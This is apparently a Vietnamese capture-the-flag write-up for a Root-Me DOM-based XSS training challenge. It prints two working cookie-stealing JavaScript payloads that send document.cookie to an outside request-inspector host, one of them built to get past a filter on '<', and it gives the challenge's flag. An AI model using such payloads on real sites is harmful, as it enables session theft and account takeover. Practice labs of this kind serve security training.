# Write up challenge XSS DOM Based - Introduction

Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>

  
[Link Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)<br>
</br>



Truy cập challenge ta thấy có một ô input cho nhập số

<img src="./img/1.png" alt="normal_acc_TRAbID"/> 

<br>

Tiến hành nhập thử thì nhận được thông báo sai

<img src="./img/2.png" alt="normal_acc_TRAbID"/>

<br>

Inspect ta thấy input được truyền y nguyên vào chuỗi number. Có thể đây là lỗ hổng! 

<img src="./img/3.png" alt="normal_acc_TRAbID"/> 

<br> 

Thử chèn câu lệnh alert bằng chèn dấu nháy đóng chuỗi và chèn tiếp câu lệnh theo sau 

<img src="./img/4.png" alt="normal_acc_TRAbID"/>

<br>

Thật vậy có lỗ hổng!

<img src="./img/5.png" alt="normal_acc_TRAbID"/>

<br>

Những gì cần làm sẽ là lợi dụng lỗ hổng này để chèn đoạn script đánh cắp cookie.

    ';document.write("<img src='https://requestinspector.com/inspect/01fzg5c75hkg0yw6dcfzrgvybd/'+document.cookie+"'>");//


<img src="./img/6.png" alt="normal_acc_TRAbID"/>

<br>

Tuy nhiên không thành công nhận được cookie, ta inspect tìm hiểu nguyên nhân thì thấy được là dấu `<` thẻ img đã được loại bỏ.

<img src="./img/7.png" alt="normal_acc_TRAbID"/>

<br> 

Không sao ta sẽ chèn hình ảnh bằng cách createElement bằng đoạn script sau 
    
   ';const My_img = document.createElement("img");var url = 'https://requestinspector.com/inspect/01fzg5c75hkg0yw6dcfzrgvybd?=';var cookie = document.cookie;url = url + cookie;My_img.src=url;document.body.appendChild(My_img);//
   

<img src="./img/8.png" alt="normal_acc_TRAbID"/>

<br>

Thành công chèn ảnh

<img src="./img/9.png" alt="normal_acc_TRAbID"/>

<br>

Nhận được request chứa cookie của user

<img src="./img/10.png" alt="normal_acc_TRAbID"/>

<br>

Tiến hành gửi url chứa ảnh lỗi cho admin

<img src="./img/11.png" alt="normal_acc_TRAbID"/>
<img src="./img/12.png" alt="normal_acc_TRAbID"/>

<br>

Có được flag:
<img src="./img/13.png" alt="normal_acc_TRAbID"/>

<br>


Submit thành công 

<img src="./img/14.png" alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** rootme{XSS_D0M_BaSed_InTr0}

